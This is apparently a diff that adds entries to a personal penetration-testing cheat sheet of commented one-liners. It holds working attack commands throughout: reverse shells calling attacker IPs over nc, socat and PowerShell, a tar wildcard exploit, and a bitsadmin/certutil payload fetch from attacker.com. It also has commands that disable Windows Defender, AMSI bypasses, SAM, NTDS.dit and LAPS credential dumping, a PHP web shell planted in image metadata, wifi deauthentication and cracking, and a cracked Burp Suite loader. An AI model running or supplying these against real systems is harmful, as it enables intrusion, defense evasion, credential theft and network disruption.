+nmap -sS -Pn --mtu 8 -F MACHINE_IP      # firewall evasion Fragment Your Packets According to a Set MTU
+
+# ARP
+
+arp -n      # See local ARP cache
+./arplayer spoof -I wlp1s0 -vvv -F -b 192.168.1.101 192.168.1.1     # ARP spoof/poisoning
+./arplayer scan -I wlp1s0 -w 10 -t 1000     # ARP scan
+
+# BASH
+
+find / -user <username> -ls 2>/dev/null | grep -v '/proc\| /run\| /sys'     # BASH Find all files owned by a user in Linux, disregarding /proc and /sys files
+script <filename.log>       # BASH Log everything that happens in a terminal
+bash -c "cat < /dev/tcp/10.13.10.69/18110" > nmap       # BASH Download files with bash only
+ip ne       # BASH View neighbor IPs (useful for docker containers)
+ip -br -c ne        # BASH View neighbor IPs (useful for docker containers)
+
+# TAR
+
+echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh       # TAR exploit 1/4
+echo "" > "--checkpoint-action=exec=sh shell.sh"        # TAR exploit 2/4
+echo "" > --checkpoint=1        # TAR exploit 3/4
+tar cf archive.tar *        # TAR exploit 4/4
+
+# REVERSE SHELL
+
+socat file:`tty`,raw,echo=0 tcp-listen:4444     # on target | rev shell
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attackerip>:4444       # on attacker | rev shell
+
+# KERBEROS
+
+scp root@10.10.120.45:/tmp/krb5cc\_613405103\_HEquhW .      # Extract kerberos ccache files for logged-in users are located in /tmp  # 1/2
+impacket-ticketConverter krb5cc\_613405103\_HEquhW amitchell.kirbi      # Convert kerberos ccache file into .kirbi file using impacket  # 2/2
+
+# KEYS
+
+ssh-keygen -y -e -f id_rsa      # Generate public RSA key from private
+
+# GIT
+
+ls | xargs -I{} git -C {} pull      # Update all Git repos in your current directory
+
+# WINDOWS CMD
+
+sc config TrustedInstaller binPath= "cmd.exe /C sc stop windefend && sc delete windefend" && sc start TrustedInstaller      # Windows cmd Disable Windows Defender
+sc config TrustedInstaller binPath="cmd.exe /C sc stop diagtrack & sc config diagtrack binPath='lol'" && sc start TrustedInstaller      # Windows cmd Block ATP communications
+reg.exe save hklm\sam c:\temp\sam.save      # WINDOWS cmd Harvest SAM 1/3
+reg.exe save hklm\security c:\temp\security.save    # WINDOWS cmd Harvest SAM 2/3
+reg.exe save hklm\system c:\temp\system.save    # WINDOWS cmd Harvest SAM 3/3
+certutil -encode beacon64.exe file.txt      # Windows cmd Encode and transfer/decode malicious file # ON ATTACKER MACHINE
+bitsadmin /Transfer myJob http://attacker.com/file.txt C:\windows\tasks\enc.txt && certutil -decode C:\windows\tasks\enc.txt C:\windows\tasks\cisa.exe && del C:\windows\tasks\enc.txt      #Windows cmd Encode and transfer/decode malicious file # ON TARGET MACHINE 
+net group "domain admins" myusername /add /domain       # Windows cmd Add current user to domain admins
+whoami /user        # Windows cmd Get user/domain SID
+sc.exe create MySvc2 binpath= c:\windows\system32\notepad.exe obj=CONTOSO.local\svcUser password=svc1234!   # windows cmd Create service to run with credentials
+schtasks.exe /create /tn notepaddaily /tr notepad.exe /sc daily /ru CONTOSO\TaskUser /rp task1234!      # Windows cmd Create scheduled task to run with credentials
+runas /netonly /user:CONTOSO\OtherUser cmd      # Windows cmd NewCredentials logon
+netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444       # windows cmd Add/Delete firewall rule
+netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444        # windows cmd Add/Delete firewall rule
+
+vssadmin create shadow /for=C:      # Windows cmd Extract NTDS.dit 1/4
+copy <shadow copy volume name>\Windows\ntds\ntds.dit C:\Windows\Temp\ntds.dit       # Windows cmd Extract NTDS.dit 2/4 OR
+reg SAVE HKLM\SYSTEM C:\Windows\Temp\SYS        # Windows cmd Extract NTDS.dit 2/4
+copy <shadow copy volume name>\Windows\System32\config\SYSTEM C:\Windows\Temp\SYS       # Windows cmd Extract NTDS.dit 3/4
+vssadmin delete shadows /shadow=<shadow ID>     # Windows cmd Extract NTDS.dit 4/4
+
+setspn -T <domain> -F -Q */*        # wiundows cmd Query Active Directory SPNs
+reg queryv x64 HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full Release      # windows cmd Enumerate .NET version installed on a host
+
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp     # windows cmd Reverse port forward Windows Firewall START
+netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444       # windows cmd Reverse port forward Windows Firewall STOP
+
+HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential      # Windows cmd Registry WDigest enable Location
+HKLM\SECURITY\Policy\Secrets        # Windows cmd Registry LSA Secrets Location
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon      # Windows cmd Registry AutoLogon Location
+HKLM\Software\Policies\Microsoft\Windows\SrpV2      # Windows cmd Registry AppLocker rules Location
+
+
+# POWERSHELL
+
+Get-Acl -Path C:\\ | Format-List        # powershell Get ACLs of object (such as files and directories)
+New-PSDrive -name cthulhufhtagn -PSProvider "FileSystem" -Root "\\<attackerip>\cthulhufhtagn"       # powershell mount remote share
+gci -Recurse -Force -Path C:\Users -Include "flag"      # powershell Search for filenames
+$client = New-Object System.Net.Sockets.TCPClient('192.168.119.154',8443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};      # powershell reverse shell oneliner
+iconv -f ASCII -t UTF-16LE powershellrev.txt | base64 | tr -d "\n"      # powershell base64 encode reverse shell
+
+## AMSI BYPASS
+
+$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;         # powershell amsi bypass 1/4
+$ABSD = 'AmsiS'+'canBuffer';        # powershell amsi bypass 2/4
+$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');        # powershell amsi bypass 3/4
+[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);      # powershell amsi bypass 4/4
+
+[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)         # powershell amsi bypass
+
+[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)        # powershell amsi bypass
+
+
+# STEGANOGRAPHY
+
+binwalk file    # Displays the embedded data in the given file STEGANOGRAPHY
+binwalk -e file     # Displays and extracts the data from the given file STEGANOGRAPHY
+diff -a img1 img2 | hexdump -C      # Compare FILES line by line       STEGANOGRAPHY
+eog images  # see the image STEGANOGRAPHY
+exiftool file  # see metadata of file STEGANOGRAPHY
+exiftool -Comment="<?php passthru(\$_GET'cmd'); _halt_compiler();" ./picture.jpeg       # Upload shell in comments STEGANOGRAPHY
+ghex file       # Modifying headers STEGANOGRAPHY
+stegcracker file wordlist       # bruteforcing images file STEGANOGRAPHY
+steghide extract -sf file       # extracts embedded data from a file STEGANOGRAPHY
+steghide embed -cf cvr.jpg -ef emb.txt      # To embed emb.txt in cvr.jpg STEGANOGRAPHY
+zsteg -a file       # extract any and all data from png files STEGANOGRAPHY
+
+
+# BUGBOUNTY
+
+echo 'tesla' | metabigor net --org -o /location/   # asn enumeration | discovery IP of a company/organization # BUGBOUNTY
+echo "ASN1111" | metabigor net --asn -o /tmp/result.txt     # discovery IP of an ASN | asn enumeration # BUGBOUNTY
+cat list_of_ASNs | metabigor net --asn -o /tmp/result.txt      # discovery IP of an ASN | asn enumeration # BUGBOUNTY
+echo "ASN1111" | metabigor netd --asn -o /tmp/result.txt    # discovery IP of an ASN | asn enumeration # BUGBOUNTY
+echo 'Target Inc' | metabigor cert --json | jq -r '.Domain' | unfurl format %r.%t | sort -u     # Getting more related domains by searching for certificate info | asn enumeration # BUGBOUNTY
+echo 'example Inc' | metabigor related -s 'cert'    # Getting more related domains by searching for certificate info | asn enumeration # BUGBOUNTY
+echo 'example.com' | metabigor related -s 'whois'   # Using Reverse Whois to find related domains | asn enumeration # BUGBOUNTY
+python3 /home/livestep/TOOLS/Asnlookup/asnlookup.py -o 'tesla'      # asn enumeration # BUGBOUNTY
+amass intel -asn 46489      # asn enumeration # BUGBOUNTY
+knockknock -n google.com -p     # reverse whois # BUGBOUNTY
+sho     # shodan initialize # BUGBOUNTY
+shodan search 'http.title:BIG-IP&reg:-Redirect' --fields ip_str --separator " " | awk '{print $1}' | cat > url.txt      #SHODAN search (F5 BIG-IP example) # BUGBOUNTY
+gospider -s https://att.com         # Linked Discovery # Subdomain enumeration # BUGBOUNTY
+echo https://google.com | hakrawler     # Linked Discovery # Subdomain enumeration # BUGBOUNTY
+cat urls.txt | hakrawler        # Linked Discovery # Subdomain enumeration # BUGBOUNTY
+echo https://google.com | hakrawler -subs # innnnnnnnnnclude subdomains   # Linked Discovery # Subdomain enumeration # BUGBOUNTY
+python3 SubDomainizer.py -u http://www.example.com      # subdomain enumeration # javascript spyder # BUGBOUNTY
+python subscraper.py -u youtube.com -o output.txt       # subdomain enumeration # BUGBOUNTY
+site:twitch.tv -www.twitch.tv -watch.twitch.tv -dev.twitch.tv       # subdomain scraping # google dork # bugbounty
+amass -d twitch.tv      # subdomain scraping # bugbounty
+subfinder -d att.com -v         # subdomain scraping # bugbounty
+python3 /home/livestep/TOOLS/github-search/github-subdomains.py -t "<token>" -d twitch.com > twitch.tv     # subdomain scraping # bugbounty
+amass enum -brute -d twitch.tv -src         # subdomain brute force # bugbounty
+aiodnsbrute domain.com      # subdomain bruting
+aiodnsbrute -w wordlist.txt -vv -t 1024 domain.com      # subdomain bruting # bugbounty
+aiodnsbrute --gethostbyname domain.com      # detects CNAMEs #subdomain bruting # bugbounty
+shuffledns -d example.com -list example-subdomains.txt -r resolvers.txt     # subdomain bruting # bugbounty
+subfinder -d example.com | shuffledns -d example.com -r resolvers.txt       # subdomain bruting # bugbounty
+echo hackerone.com | shuffledns -w wordlist.txt -r resolvers.txt         # subdomain bruting # bugbounty
+grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"     # Search sql injection # bugbounty
+curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | httpx -title -silent | anew        # search subdomains in cert.sh  # bugbounty
+curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew       # # search subdomains in cert.sh  # bugbounty
+gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'     # Injection xss using qsreplace to urls filter to gospider  # bugbounty
+apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|schemas.android\|google\|goo.gl"       # Extract URL's to apk # bugbounty
+shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/        # shodan + nuclei # bugbounty
+gau testphp.vulnweb.com | tee -a archive 1>/dev/null && gf redirect archive | cut -f 3- -d ':' | qsreplace "https://evil.com" | httpx -silent -status-code -location        # open redirection oneliner  # bugbounty
+gau testphp.vulnweb.com | tee -a archive 1>/dev/null && gf redirect archive | qsreplace FUZZ | cut -f 3- -d ':' | while read url; do ffuf -w word -u "$url"  -c=true -sa=true  -sf=true -se=true -mc=302  -v 2>/dev/null ; done  # One-liner for fuzzing urls for open redirection # bugbounty
+domain="att.com";shodan domain $domain | awk -v domain="$domain" '{print $1"."domain}'| httpx -threads 300 | anew shodanHostsUp | xargs -I@ -P3 sh -c 'jaeles -c 300 scan -s jaeles-signatures/ -u @'| anew JaelesShodanHosts       # Using shodan to jaeles  # bugbounty
+altdns -i subdomains.txt -o data_output -w words.txt -r -s results_output.txt       # Subdomain discovery through alterations and permutations  # bugbounty
+curl -s --request GET --url https://api.securitytrails.com/v1/domain/att.com/subdomains?apikey=$seckey | jq '.subdomains[]' | sed 's/\"//g' >test.txt 2>/dev/null && sed "s/$/.att.com/" test.txt | sed 's/ //g' && rm test.txt       #find subdomains  # bugbounty
+cat recon/example/domains.txt | httprobe        # hosts alive  #bugbounty
+cat domains.txt | httprobe -p http:81 -p https:8443         # hosts alive# ports custom  # bugbounty
+cat domains.txt | httprobe -s -p https:8443     # hosts alive # only probe in port 8443 # bugbounty
+cat domains.txt | httprobe --prefer-https       # hosts alive # only https # bugbounty
+masscan -p1-65535 -iL $ipFile --max-rate 1800 -oG $outPutFile.log       # portscan # bugbounty
+nmap outPutFile.log -oG nmap.gnmap      # portscan # bugbounty
+brutespray --file nmap.gnmap        # default passwords # bugbounty
+curl -v -H "Host: localhost" https://target/        # HTTP Host header: localhost  # bugbounty
+wget -d --header="Host: localhost" https://target/      # HTTP Host header: localhost  # bugbounty
+python3 /home/livestep/TOOLS/rapiddns/rapiddns.py att.com       # Extract subdomains from rapiddns # bugbounty
+
+cat my_targets.txt | xargs -I %% bash -c 'echo "http://%%/favicon.ico"' > targets.txt   # get hash of favicon  # bugbounty (1 of 2)
+python3 /home/livestep/TOOLS/favihash/favihash.py -f https://target/favicon.ico -t targets.txt -s       # Find related domains via favicon hash  # bugbounty (2 of 2)
+
+gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt && sort -u urls.txt | fff -s 200 -o out/      # Search for testing point with gau and fff  # bugbounty (1 of 2)
+for i in `gf -list`; do [[ ${i} =~ "_secrets"* ]] && gf ${i}; done      # After we save responses from known URLs, it's time to dig for secrets ## bugbounty (2 of 2)
+
+wget -r --no-parent target.com/dir      # Mirror a web directory structure  # bugbounty
+
+curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq       # Find sensitive information with AlienVault OTX  # bugbounty
+curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq -r '.url_list[].url'      # To get only the list of URLs  # Find sensitive information with AlienVault OTX  # bugbounty
+
+eyewitness <file>       # take screenshots  # bugbounty
+echo target.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'     # Find javascript files using gau and httpx  # bugbounty
+cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u     # Extract API endpoints from javascript files  # bugbounty
+
+dirsearch.py -u target -e php,html,js,xml -x 500,403        # Find databases secrets in SVN repository # bugbounty (1 of 2)
+python3 /home/livestep/TOOLS/svnextractor/svn-extractor.py --url http://url.com --match database.php        # # Find databases secrets in SVN repository # bugbounty (2 of 2)
+
+assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done  #  Find hidden GET parameters in javascript files nd appends them as parameters # bugbounty
+
+assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin: evil.com" {} | [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n3[0;32m[VUL TO CORS] 3[0m{}"' 2>/dev/null         # Find web servers vulnerable to CORS attacks # bugbounty
+
+shodan search org:"target" product:"Kubernetes" | awk '{print $3 ":" $2}' | httpx -path /pods -content-length -status-code -title       # looking for kubernetes # bugbounty
+shodan search org:"target" port:"10250" | awk '{print $3 ":" $2}' | httpx -path /pods -content-length -status-code -title       # looking for kubernetes # bugbounty
+nuclei -update-templates        # Update nuclei templates # bugbounty
+echo https://example.com | nuclei -t 'cves/CVE-2020*'       # Search for CVEs of specific year # bugbounty
+echo http://jira.targetsite.com | nuclei -t workflows/jira-exploitaiton-workflow.yaml       # Scan Jira for known CVEs and misconfigurations  # bugbounty
+
+curl -s -L -k https://gitlab.com/favicon.ico | python3 -c 'import mmh3,sys,codecs; print(mmh3.hash(codecs.encode(sys.stdin.buffer.read(),"base64")))'       # alculate hash of a favicon on an arbitrary URL  # bugbounty
+shodan search http.favicon.hash:1278323681      # search in SHODAN for favicon hash # bugbounty
+cat hosts.txt | httprobe -c 300 | ffuf -w - -u FUZZ -mr "assword"       # Search for login portals and default creds  # bugbounty
+
+# BURPSUITE
+
+alias burp='java -noverify -javaagent:/home/livestep/TOOLS/burp/burploader.jar -jar /home/livestep/TOOLS/burp/burpsuite_pro_v2022.3.9.jar'  # BurpSuite # BUGBOUNTY
+
+# WIFI
+
+ifconfig wlan0 down     # Disabled the wifi # WIFI
+macchanger -p XX:XX:XX:XX:XX:XX  wlan0   # Change permanently the mac address    # WIFI
+macchanger -m XX:XX:XX:XX:XX:XX  wlan0   # Change the mac address to a specific mac    # WIFI
+macchanger -r  wlan0   # Change the mac address to a random mac    # WIFI
+ifconfig wlan0 up    # enabled the wifi # WIFI
+iwconfig wlan0 mode monitor     # Put in Monitor Mode       # WIFI
+iwconfig wlan0 mode managed     # Put in managed Mode       # WIFI
+iwconfig    # See the state of wifi card        # WIFI
+sudo airmon-ng start wlan0   # Put in monitor mode   # WIFI
+sudo airodump-ng wlan0   # Search for access points nearby  # WIFI
+sudo airodump-ng --channel X --bssid XX-XX-XX-XX-XX-XX --write file wlan0       # capture a BSSID and writing to file   # WIFI
+sudo airodump-ng wlan0 --band g     # Captures only 2.4G # WIFI
+sudo airodump-ng wlan0 --band a     # Captures only 5G # WIFI
+sudo aireplay-ng -0 3 -a <BSSID> -c <STATION> wlan0     # Disconect a client to a BSSID and capture the handshake  (3 is number of packets)   # WIFI
+sudo aireplay-ng -0 0 -a <BSSID> wlan0     # Jamming the network   # WIFI
+
+# WINDOWS CMDs
+assoc   # Windows cmd  -Displays or modifies file name extension associations.
+call   # Windows cmd  -Call one batch program from another
+cd    # Windows cmd  -Change Directory – move to a specific Folder
+cls    # Windows cmd  -Clear the screen
+color    # Windows cmd  -Change colours of the CMD window
+copy    # Windows cmd  -Copy one or more files to another location
+date    # Windows cmd  -Display or set the date
+del    # Windows cmd  -Delete one or more files
+dir    # Windows cmd  -Display a list of files and folders
+del -   # Windows cmd  Display message on screen
+endlocal    # Windows cmd  -End localisation of environment changes in a batch file
+erase    # Windows cmd  -Delete one or more files
+exit    # Windows cmd  -Quit the current script/routine
+for /f    # Windows cmd  -Loop command: against a set of files
+ftype    # Windows cmd  -File extension file type associations
+goto    # Windows cmd  -Direct a batch program to jump to a labelled line
+if    # Windows cmd  -Conditionally performs a command
+md    # Windows cmd  -Create new folder (directory)
+mkdir    # Windows cmd  -Create new folder (directory)
+move    # Windows cmd  -Move files from one folder to another
+path    # Windows cmd  -Display or set a search path for executable files
+pause    # Windows cmd  -Suspend processing of a batch file and display a message
+popd    # Windows cmd  -Return to a previous directory saved by pushd
+prompt    # Windows cmd  -Change the command prompt
+pushd    # Windows cmd  -Save and then change the current directory
+rem    # Windows cmd  Record comments (remarks) in a batch file
+ren    # Windows cmd  -Rename a file or files
+rd    # Windows cmd  -Delete folder(s)
+set    # Windows cmd  -Display, set, or remove session environment variables
+setlocal    # Windows cmd  -Control the visibility of environment variables
+shift    # Windows cmd  -Shift the position of batch file parameters
+start    # Windows cmd  -Start a program, command or batch file
+time    # Windows cmd  -Display or set the system time
+title    # Windows cmd  -Set the window title for a cmd.exe session
+type    # Windows cmd  -Display the contents of a text file
+ver    # Windows cmd  -Display version information
+verify    # Windows cmd  -Verify that files have been saved
+vol    # Windows cmd  -Display a disk label
+::    # Windows cmd  -Comment / Remark
+for /L %i in (1,1,255) do @ping -n 1 -w 200 172.21.10.%i > nul && echo 192.168.1.%i     # Windows ping sweep
+
+
+
+# LINUX PRIVESC
+
+openssl passwd -1 -salt livestep livestep # Create passwd 
+ln -s /etc/passwd file  # Create symlink
+for i in {1..254} ;do (ping -c 1 172.21.10.$i | grep "bytes from" &) ;done  # Linux ping sweep
+
+# DNS RECON
+
+dnsrecon -d www.example.com -a  # dnsrecon
+dnsrecon -d www.example.com -t axfr # dnsrecon
+dnsrecon -d www.example.com -D <namelist>-t brt</namelist>  # dnsrecon
+
+# ARP SCANNING
+
+netdiscover -i eth0     # netdiscover
+netdiscover -r 172.32.21.0/24       # netdiscover
+
+
+
+
+# TCPDUMP
+
+tcpdump -i eth0
+tcpdump -c -i eth0
+tcpdump -A -i eth0
+tcpdump -w 0001.pcap -i eth0
+tcpdump -r 0001.pcap
+tcpdump -n -i eth0
+tcpdump -i eth0 port 22
+tcpdump -i eth0 -src 172.21.10.X
+tcpdump -i eth0 -dst 172.21.10.X
+
+
+# WIRELESS | WIFI
+
+airmon-ng start wlan0   # Wifi Enabling Monitor Mode
+iwconfig    # Wifi Check the enabling of monitor mode
+airodump-ng wlan0mon    # Wifi Sniffing Wireless Packets
+airodump-ng wlan0mon -c 3 --bssid 18:X:X:X:X:X -w pwd   # Wifi initiate the sniffing on particular device
+aireplay-ng --deauth 0 -a 18:X:X:X:X:X wlan0mon     # Wifi Deauthencating Users
+aircrack-ng pwd-01.cap -w dict.txt      # Wifi Cracking Password
+
+C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\***    # WiFi password with their respective SSID are stored in an XML file
+netsh wlan show profiles        # WIFI list of the SSIDs that the device has been connected to
+netsh wlan show profile name=<SSID Name> key=clear      # Wifi | to know the passwords of any one of the mentioned SSIDs
+lazagne.exe wifi        # Wifi | Opensource | retrieve all the passwords stored
+
+# LAPS
+
+crackmapexec ldap 192.168.1.172 -u administrator -p 'Ignite@123' --kdcHost 192.168.1.172 -M laps    # dump the credentials from LAPS in clear text
+Get-LAPSPasswords -DomainController 192.168.1.172 -Credential IGNITE\Administrator | Format-Table -AutoSize     # # dump the credentials from LAPS in clear text
+SharpLAPS.exe /user:IGNITE\Administrator /pass:Ignite@123 /host:192.168.1.172   # dump the credentials from LAPS in clear text   
